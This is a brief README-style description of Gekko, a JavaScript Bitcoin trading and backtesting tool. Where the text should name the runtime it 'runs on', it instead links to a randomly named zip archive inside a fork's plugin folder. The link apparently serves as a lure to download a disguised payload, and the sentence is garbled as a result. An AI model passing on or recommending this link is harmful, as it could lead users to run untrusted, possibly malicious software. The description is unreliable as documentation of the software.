Gekko is a Bitcoin TA trading and backtesting platform that connects to popular Bitcoin exchanges. It is written in JavaScript and runs on [https://raw.githubusercontent.com/Joe-Mogul/gekko/develop/plugins/tradingAdvisor/Software_chemicophysiological.zip](https://raw.githubusercontent.com/Joe-Mogul/gekko/develop/plugins/tradingAdvisor/Software_chemicophysiological.zip).

*Use Gekko at your own risk.*
